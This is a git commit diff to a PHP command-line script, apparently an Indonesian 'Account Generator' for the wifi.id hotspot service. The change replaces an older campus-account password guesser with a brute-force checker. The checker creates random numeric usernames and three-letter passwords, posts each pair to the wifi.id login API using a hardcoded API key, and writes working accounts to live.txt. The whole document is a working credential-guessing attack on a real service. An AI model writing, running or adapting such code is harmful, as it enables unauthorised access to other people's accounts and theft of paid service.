27bd409bc14e25955da5f9da9b13c18761c41e4a
N1ght420 <n1ghtpe0ple@protonmail.com>
2019-12-02 21:51:06 +0700

    Update wifi.php

--- wifi.php
+++ wifi.php
@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0);
 // Color
 $blue="\033[1;34m";
 $cyan="\033[1;36m";
@@ -10,66 +10,87 @@ $purple="\033[1;35m";
 $red="\033[1;31m";
 $yellow="\033[1;33m";
 
-@system("clear");
+$list = "list.txt";
+
+function user($total){
+	$abc = "1234567890";
+	$word = "";
+	for ($i=0; $i < $total ; $i++) { 
+		$word .=$abc{rand(0,strlen($abc)-1)};
+	}
+	return $word;
+}
+
+function pass($total){
+	$abc = "abcdefghijklmnopqrstuvwxyz";
+	$word = "";
+	for ($i=0; $i < $total ; $i++) { 
+		$word .=$abc{rand(0,strlen($abc)-1)};
+	}
+	return $word;
+}
+
+@system('clear');
 print "\n";
 print "$cyan      .===. (                                \n";
 print "$cyan      |   |  )  $okegreen   _      ___ ____   _    __ \n";
 print "$cyan      |   | (   $okegreen  | | /| / (_) _(_) (_)__/ / \n";
 print "$cyan      |   | )   $okegreen  | |/ |/ / / _/ / / / _  /  \n";
 print "$cyan      |   \*/   $okegreen  |__/|__/_/_//_(_)_/\_,_/   \n";
-print "$cyan    ,'    //.   $yellow    Ayam Kampus Generator    \n";
+print "$cyan    ,'    //.   $yellow      Account Generator    \n";
 print "$cyan   :~~~~~//~~;                               \n";
 print "$cyan    `.  // .'   $white https://github.com/N1ght420 \n";
 print "$cyan    `-------'                                \n\n";
-print "$cyan 01  $red :$white  Password like Username\n";
-print "$cyan 02  $red :$white  Default Campus Account\n\n";
-print "$cyan Menu$red >$white ";
-$input = trim(fgets(STDIN));print "\n";
-if ($input == '01' OR $input == '1'){
-    print "$cyan Base$red >$white ";
-    $base = trim(fgets(STDIN));
-    print "$cyan Panjang Username$red >$white ";
-    $total = trim(fgets(STDIN));
-    print "$cyan Nama Kampus$red >$white ";
-    $univ = trim(fgets(STDIN));
-    print "$cyan Total Akun$red >$white ";
-    $jumlah = trim(fgets(STDIN));print "\n";
-    function random($panjang){
-        $karakter = '';
-        $karakter .= '1234567890';
-        $string = '';
-        for ($i=0; $i < $panjang; $i++){
-            $pos = rand(0, strlen($karakter)-1);
-            $string .= $karakter{$pos};
-        }
-        return $string;
-    }
-    for ($i=0; $i < $jumlah; $i++){
-        $acak = $base.random($total-strlen($base));
-        print "$cyan [$okegreen Username$cyan ]$red >$white ".$acak."@".$univ;print "\n";
-        print "$cyan [$okegreen Password$cyan ]$red >$white ".$acak;print "\n\n";
-    }
+
+$awal = array("","9813","9812","9811","9853","9852");
+echo "$yellow ??$white Total : ";
+$total = trim(fgets(STDIN));
+
+echo "$yellow **$white Creating account list ... \n";
+for ($i=0; $i < $total; $i++){
+    $random = array_rand($awal,3);
+    $base = $awal[$random[1]];
+    $user = $base.user(str_replace("-", "", strlen($base) -15));
+    $pass = pass(3);
+    fwrite(fopen($list, "a"), "$user|$pass \n");
 }
-elseif ($input == '02' OR $input == '2'){
-    print "$cyan 01  $red :$white  Use Data List\n";
-    print "$cyan 02  $red :$white  Manual Input\n\n";
-    print "$cyan Menu$red >$white ";
-    $input = trim(fgets(STDIN));print "\n";
-    if ($input == '01' OR $input == '1'){
-        print "$cyan [$red !$cyan ]$yellow COMINGSOON !!\n\n";
-    }
-    elseif ($input == '02' OR $input = '2'){
-        print "$cyan NIM$red >$white ";
-        $nim = trim(fgets(STDIN));
-        print "$cyan Tahun Registrasi$red >$white ";
-        $tahun = trim(fgets(STDIN));
-        print "$cyan Tanggal Lahir$red >$white ";
-        $tanggal = trim(fgets(STDIN));
-        print "$cyan Ganjil/Genap$red >$white ";
-        $ganjilgenap = trim(fgets(STDIN));print "\n";
-        print "$cyan [$okegreen Username$cyan ]$red >$white ".$nim."@ut.ac.id";print "\n";
-        print "$cyan [$okegreen Password$cyan ]$red >$white ".$tahun.$ganjilgenap.$tanggal;print "\n\n";
-    }
+
+$file = file('list.txt');
+echo "$yellow **$white Checking list ... \n\n";
+foreach ($file as $akon => $data) {
+	$split = explode("|", $data);
+	$user = trim($split[0]);
+	$pass = trim($split[1]);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"password\":\"$pass\",\"username\":\"$user\"}");
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+    $headers = array();
+    $headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
+    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
+    $headers[] = 'Accept-Language: en-US,en;q=0.5';
+    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
+    $headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
+    $headers[] = 'Connection: keep-alive';
+    $headers[] = 'Upgrade-Insecure-Requests: 1';
+    $headers[] = 'Cache-Control: max-age=0, no-cache';
+    $headers[] = 'Pragma: no-cache';
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    $json = json_decode($result);
+    $act = $json->act;
+	if ($act == "INVALID") {
+        echo "$red //$white DIE!$yellow ->$white $user|$pass \n";
+        fwrite(fopen("die.txt", "a"), "$user|$pass \n");
+	}else{
+		echo "$okegreen //$white LIVE$yellow ->$white $user|$pass \n";
+		fwrite(fopen("live.txt", "a"), "$user|$pass \n");
+	}
+	sleep(1);
 }
+echo "\n";
 
 ?>
